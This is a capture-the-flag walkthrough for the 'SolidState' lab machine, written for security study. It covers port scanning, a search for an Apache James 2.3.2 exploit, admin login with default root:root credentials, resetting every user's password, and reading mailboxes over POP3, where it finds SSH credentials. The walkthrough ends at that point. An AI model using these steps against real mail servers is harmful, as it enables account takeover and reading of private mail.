# SolidState
**Machine ip:** 10.10.10.51

## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.51 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.51`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cffe61ef-f4fa-4ed9-a7b6-151d7fc033f5)

+ The result shows that 5 ports are open:
```
Port 22: OpenSSH 7.4p1
Port 25: JAMES smtpd 2.3.2
Port 80: httpd 2.4.25
Port 110: JAMES pop3d 2.3.2
Port 119: JAMES nntpd
Port 4555: JAMES Remote Administration Tool 2.3.2
```

+ Navigate to `http://10.10.10.51/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8873f868-18e3-4fe4-9b10-4cc631320a78)

+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.51/ -k -n -x html,php,txt -r -t 50
```

+ There is nothing here.

+ James stands for Java Apache Mail Enterprise Server. James Mail Server listens on four ports which are SMTP on TCP 25, POP3 on TCP 110, NNTP on TCP 119 and TCP 4555.
+ Firstly, check TCP port 4555 because it is the James administration port.
+ `searchsploit james 2.3.2`
+ [Apache James Server 2.3.2 - Remote Command Execution](https://www.exploit-db.com/exploits/35513)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a7cb78dc-cf4a-4d77-94a9-ee7f79588aa9)

+ `searchsploit -m 35513`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c43603ab-f981-4e94-8d30-edf92e1effb1)

+ Connect to port 4555 with `root`:`root` using nc: `nc 10.10.10.51 4555`
+ List commands: `HELP`
+ To list users: `listusers`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/86624a9b-8b8d-477b-a421-5cabeabe861a)

+ Discovered 5 accounts:
```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

+ Reset their passwords: `setpassword [username] [password] `

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/faf2449a-aab0-468f-9120-b76f41a0d3f9)

+ Connect to POP3 on TCP 110 to check mails using **telnet**.
```
telnet 10.10.10.51 110
USER james
PASS 123
LIST
```

+ There is no **james**' mail.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3ee62ffa-8051-45c4-86d4-bbfc2ee80d82)

+ `Ctrl + D` and `quit` to quit telnet and open new telnet.
+ There is no mail for **thomas**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/28dba85b-5eb7-46f7-9b3e-68b223e68704)

+ There is a mail for **john**. Use to read: `retr 1`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/92417947-5654-4752-983c-be79a936f3af)

+ Check mindy's mail.
+ There are 2 mails.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5ba2891c-17c9-408d-a446-a3298b47a897)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/156327e7-c701-47f5-b872-c11f1ea4f5d0)

+ On the second mail, discovered mindy's ssh credentials:
```
username: mindy
pass: P@55W0rd1!2@
```












# References & Alternatives:
+ https://vvmlist.github.io/#solidstate
+ https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
